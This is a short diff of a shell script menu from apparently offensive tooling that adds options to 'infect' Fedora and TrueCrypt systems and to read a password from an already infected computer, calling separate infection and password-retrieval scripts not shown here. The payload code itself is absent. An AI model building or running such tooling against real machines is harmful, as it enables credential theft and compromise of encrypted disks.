@@ -50,16 +50,36 @@ infect_debian()
 
 infect_fedora()
 {
-    echo "Launching infection .."
-    # TODO
-
+    echo "-- Choose an option:"
+    echo "   1) Infect"
+    echo "   2) Read password (The computer should be already infected)"
+   
+   while read response; do
+        case $response in
+            "1")
+                echo "Launching infection ..."
+                /usr/bin/debian_infection/infect.sh
+                break
+                ;;
+           "2")
+                echo "Try to read password ..."
+                /usr/bin/debian_infection/get_password.sh
+                break
+                ;;
+            *)
+                echo "Choose 1 or 2"
+                ;;
+        esac
+    done
 }
 
-infect_windows()
+
+
+
+infect_truecrypt()
 {
     echo "Launching infection .."
-    # TODO
-
+    /usr/bin/infect-tc.sh 
 }
 
 
@@ -85,7 +105,7 @@ while read LINE; do
             display_menu
             ;;
         "5")
-            infect_windows
+            infect_truecrypt
             display_menu
             ;;
         *)
